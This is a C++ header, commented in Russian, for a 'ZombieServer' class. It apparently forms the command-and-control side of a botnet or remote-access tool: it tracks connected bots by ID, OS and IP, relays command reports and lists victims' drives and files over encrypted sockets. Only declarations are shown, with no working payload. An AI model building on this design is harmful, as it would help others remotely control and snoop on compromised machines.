#pragma once

#define PORT 666							// Порт для подключения клиентов
#define MAX_CLIENT 20						// Максимальное число подключенных клиентов
#define PACKET_SIZE	4112					// Размер сообщения, которым обмениваются сервер и клиент
#define PACKET_DATA_SIZE 4096				// Размер данных в пакете
#define SEND_BUFFER_SIZE PACKET_SIZE * 10	// Размер буффера для отправки данных клиенту

// Сообщения сервера, которые должно обрабатывать окно
#define WM_JOINED_CLIENT	WM_USER+1
#define WM_CLOSE_CLIENT		WM_USER+2
#define WM_CMD_REPORT		WM_USER+3
#define WM_DRIVE			WM_USER+4
#define WM_FILE				WM_USER+5

struct User
{
	char id[128];
	char name[128];
	char os[128];
	char ip[128];
	char ver[128];

	wchar_t wID[128];
	wchar_t wName[128];
	wchar_t wOS[128];
	wchar_t wIP[128];
	wchar_t wVer[128];
};

struct UserFile
{
	char name[128];
	char size[128];
	char type[128];
	int image;
};

class ZombieServer
{
public:
	ZombieServer();
	BOOL StartServer(HWND hWnd);							// Стартует сервер и прицепляет события сервера к окну
	BOOL SendPacket(int id, Packet* packet);				// Отсылает сообщение

private:
	static DWORD WINAPI ThreadEvents(LPVOID lpParameter);	// Поток обработки событий сервера
	BOOL AcceptClient(DWORD index);							// Подключает нового клиента
	BOOL WriteClient(DWORD index);							// Отправляет данные из временного буффера
	BOOL ReadClient(DWORD index);							// Читает пришедшее сообщение									
	void CloseClient(DWORD index);							// Закрывает соединение с клиентом (возвращает ID отсоединившегося клиента)
	void WorkData(Packet* pak);
	void  ParseUser(char*, User*);
	void Crypt(char* cryptData, int sizeCryptData);
	DWORD ParsePacketType(char* data);
	DWORD ParseID(char* data);
	DWORD ParseID1(char* data);
	DWORD ParseID2(char* data);

	HWND hWnd;												// Хендл окна, которому необходимо передавать сообщения

	int GetID(DWORD index);	// Возвращает ID бота
	SOCKET client_socket[MAX_CLIENT + 1];
	WSAEVENT client_event[MAX_CLIENT + 1];
	int eventTotal;

	// Клиентские данные
	BOOL writeAccess[MAX_CLIENT + 1];				// Индикатор доступа к записи в сокет
	char recvBuffer[MAX_CLIENT + 1][PACKET_SIZE];	// Буфер для приема данных
	char* writeBuffer[MAX_CLIENT + 1];				// Указатель на временный буфер отправляемый данных
	int sizeWriteBuffer[MAX_CLIENT + 1];			// Размер временного буфера отправляемых данных (может приращиваться)
	int id[MAX_CLIENT + 1];							// id клиента
	int numRecv[MAX_CLIENT + 1];					// Число байт в буфере принятых данных
	int numSend[MAX_CLIENT + 1];					// Число уже записанных байт во временном буфере отправляемых данных (writeBuffer)

													// Уникальный ID назначаемый сервером клиенту
	int unicID;
};

